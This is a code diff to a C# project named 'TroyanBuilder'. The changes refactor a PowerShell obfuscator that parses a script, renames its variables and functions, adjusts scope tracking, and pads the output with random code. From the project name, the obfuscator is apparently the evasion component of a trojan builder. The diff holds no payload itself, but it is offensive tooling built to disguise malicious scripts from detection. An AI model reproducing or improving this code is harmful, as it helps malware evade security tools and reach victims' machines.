@@ -28,21 +28,15 @@ namespace TroyanBuilder
                     }
                 }
                 var parsed = Parse(psScript);
-            
-                FindAndRenameFunctions(parsed, "general");
-                psScript = Obfuscate(parsed);
-                parsed = Parse(psScript);
-
                 FindAndRenameVariables(parsed, "general", false);
                 psScript = Obfuscate(parsed);
                 parsed = Parse(psScript);
-            
-            
-                ObfuscateFunctions(parsed, "general");
+                FindAndRenameFunctions(parsed, "general");
                 psScript = Obfuscate(parsed);
                 parsed = Parse(psScript);
-            
-     
+                ObfuscateFunctions(parsed, "general");
+                parsed = Parse(psScript);
+                psScript = Obfuscate(parsed);
                 return RandomCode() + psScript + RandomCode();
             }
             catch (Exception e)
@@ -70,8 +64,12 @@ namespace TroyanBuilder
         
         static List<string> ExtractVariableNames(string input)
         {
-            var matches = Regex.Matches(input, @"\$(\w+)");
-            return matches.Select(m => m.Groups[1].Value).Distinct().ToList();
+            var matches = Regex.Matches(input, @"\$(\w+)|\$\(\$\(([\w\-]+)\)\)");
+            return matches.Cast<Match>()
+                .Select(m => m.Groups[1].Success ? m.Groups[1].Value : m.Groups[2].Value)
+                .Where(name => !string.IsNullOrEmpty(name))
+                .Distinct()
+                .ToList();
         }
 
         private  string Obfuscate(Parsed parsed)
@@ -79,11 +77,12 @@ namespace TroyanBuilder
             var inScope = false;
             var scope = "general";
             var level = 0;
+            var intLevel = 0;
             var sb = new StringBuilder(parsed.PsScript.Length);
-            int lastPos = 0;
+            var lastPos = 0;
             foreach (var token in parsed.Tokens)
             {
-                string tokenText = clean(token.Text);
+                var tokenText = clean(token.Text);
                 if (token.Extent.StartOffset > lastPos && lastPos >= 0 && token.Extent.StartOffset <= parsed.PsScript.Length)
                 {
                     var q = parsed.PsScript.AsSpan(lastPos, token.Extent.StartOffset - lastPos);
@@ -102,6 +101,10 @@ namespace TroyanBuilder
                         scope = tokenText;
                     }
                 }
+                else if (token.Kind == TokenKind.AtCurly || token.Kind == TokenKind.AtParen)
+                {
+                    intLevel += 1;
+                }
                 else if (token.Kind == TokenKind.LCurly)
                 {
                     if (inScope)
@@ -111,7 +114,11 @@ namespace TroyanBuilder
                 }
                 else if (token.Kind == TokenKind.RCurly)
                 {
-                    if (inScope)
+                    if (intLevel > 0)
+                    {
+                        intLevel -= 1;
+                    }
+                    else if (inScope)
                     {
                         level -= 1;
                         if (level == 0)
@@ -131,14 +138,18 @@ namespace TroyanBuilder
                         {
                             if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                             {
-                                tokenText = tokenText.Replace(variableName, renamedVar);
+                                tokenText = ReplaceVariable(tokenText, variableName, renamedVar);
+                            } else
+                            if (TryGetRenamedFunc( variableName, out var renamedFunc))
+                            {
+                                tokenText = ReplaceVariable(tokenText, variableName, renamedFunc);
                             }
                         }
                         sb.Append(tokenText);
                     }
                     else if (token.Kind == TokenKind.Variable)
                     {
-                        string variableName = tokenText.TrimStart('$');
+                        var variableName = tokenText.TrimStart('$');
                         if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                         {
                             sb.Append('$' + renamedVar);
@@ -150,7 +161,7 @@ namespace TroyanBuilder
                     }
                     else if (token.Kind == TokenKind.Identifier && inScope)
                     {
-                        string tokenName = tokenText;
+                        var tokenName = tokenText;
                         if (TryGetRenamedFunc(tokenName, out var renamedVar))
                         {
                             sb.Append(renamedVar);
@@ -162,7 +173,7 @@ namespace TroyanBuilder
                     }
                     else if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic)
                     {
-                        string tokenName = clean(tokenText);
+                        var tokenName = clean(tokenText);
                         if (TryGetRenamedVar(scope, tokenName, out var renamedVar))
                         {
                             sb.Append(renamedVar);
@@ -196,6 +207,29 @@ namespace TroyanBuilder
 
             return sb.ToString();
         }
+        
+        static string ReplaceVariable(string input, string variable, string replacement)
+        {
+            // Special variables to exclude
+            string[] specialVariables = { "$_", "$?", "$null", "$true", "$false", "$env:" };
+
+            // Create regex pattern to match $variable, ($variable), and $($variable)
+            var pattern = @"\$\(\$?" + Regex.Escape(variable) + @"\)|\$(" + Regex.Escape(variable) + @")";
+        
+            // Check if the variable is a special variable. If it is, skip replacement
+            foreach (var specialVar in specialVariables)
+            {
+                if (variable.Equals(specialVar.Trim('$')))
+                {
+                    return input; // Return input as is without any modification
+                }
+            }
+
+            // Replace all occurrences of $variable, ($variable), and $($variable) with the replacement value
+            var result = Regex.Replace(input, pattern, "$" + replacement);
+
+            return result;
+        }
 
         public class VarInfo
         {
@@ -207,14 +241,14 @@ namespace TroyanBuilder
 
         private  List<string> Exclusions = new List<string>()
         {
-            "true", "false","_","Get-MachineCode","EncodedScript"
+            "true", "false","_","EncodedScript"
         };
 
         private  VarInfo GetInfo(VariableExpressionAst variable, string scope)
         {
             var result = new VarInfo();
             result.Scope = scope;
-            string variableName = variable.VariablePath.UserPath;
+            var variableName = variable.VariablePath.UserPath;
             result.Name = variableName.TrimStart('$');
             if (Exclusions.Select(a=> a.ToLower()).Contains(variableName.ToLower()))
                 result.IsParameter = true;
@@ -239,7 +273,8 @@ namespace TroyanBuilder
 
         private  void FindAndRenameVariables(Parsed parsed, string scope, bool nested)
         {
-            var vars = parsed.Body.FindAll(x => x is VariableExpressionAst, nested).Cast<VariableExpressionAst>();
+            var vars = parsed.Body.FindAll(x => x is VariableExpressionAst, nested).Cast<VariableExpressionAst>()
+                .ToList();
             foreach (var variableAst in vars )
             {
                 var info = GetInfo(variableAst, scope);
@@ -261,7 +296,7 @@ namespace TroyanBuilder
         {
             if (scope != "general")
             {
-                bool exists = TryGetRenamedVar("general", name, out var globalVar);
+                var exists = TryGetRenamedVar("general", name, out var globalVar);
                 if (exists)
                 {
                     RenamedVar.TryAdd(scope, new Dictionary<string, string>());
